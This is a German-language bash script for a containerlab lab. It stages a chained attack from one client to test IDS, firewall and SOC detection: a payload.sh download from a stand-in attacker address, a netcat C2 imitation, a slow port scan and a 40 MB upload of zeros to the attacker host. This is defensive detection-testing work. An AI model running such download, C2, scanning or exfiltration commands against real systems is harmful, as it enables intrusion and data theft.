#!/usr/bin/env bash
# Kette A - interner verketteter Angriff, als Nachweis der Abwehr.
# Erzeugt Testverkehr aus client1 gegen das eigene Labor. Schritt fuer Schritt.
# Die eigentliche Detektions-/Korrelationslogik liegt bei Person B.
# Aufruf: sudo ./attacks/kette-a.sh
set -uo pipefail
P=clab-solodmz
step(){ echo; echo "=== $* ==="; read -rp "   [Enter] ausfuehren "; }
C1(){ docker exec "$P-client1" "$@"; }

step "A1  Skript-Download vom Angreifer-Host (soll IDS/IPS-Signatur ausloesen)"
# harmloser Platzhalter-Download; die Signatur reagiert auf den Dateinamen .sh
C1 sh -c "curl -s --max-time 4 http://203.0.113.10/payload.sh -o /tmp/p.sh 2>/dev/null; echo 'Download versucht'"

step "A2  Steuerkanal-Nachbildung: Verbindung auf 443 ohne TLS (Anomalie)"
C1 sh -c "for i in 1 2 3; do (echo hello | nc -w1 203.0.113.10 443) 2>/dev/null; sleep 1; done; echo 'C2-Nachbildung gesendet'"

step "A3  Langsame Erkundung im Client-Netz (unter der Scan-Bremse)"
C1 sh -c "for p in 22 80 445 3389; do nc -z -w1 10.0.20.11 \$p 2>/dev/null && echo \"Port \$p offen\"; sleep 3; done; echo 'Erkundung erzeugt ROUTER-C2C-Logs'"

step "A4  Abruf der Dateifreigabe auf client2 (erlaubt, aber protokolliert)"
C1 sh -c "curl -s --max-time 4 http://10.0.20.11:8080/ -o /dev/null 2>/dev/null; echo 'Zugriff auf Freigabe (ROUTER-C2C)'"

step "A5  Grosser Datenabfluss ins Internet (soll Exfil-Bremse SF-16 ausloesen)"
# erzeugt >20 MB Upload in einer Verbindung; die Inner-FW soll ab 20 MB kappen
C1 sh -c "head -c 40000000 /dev/zero | curl -s --max-time 20 --data-binary @- http://203.0.113.10/up >/dev/null 2>&1; echo 'Upload-Versuch beendet (INNER-EXFIL erwartet)'"

echo; echo "Kette A abgeschlossen. Im SOC als Zeitleiste fuer 10.0.20.10 pruefen."
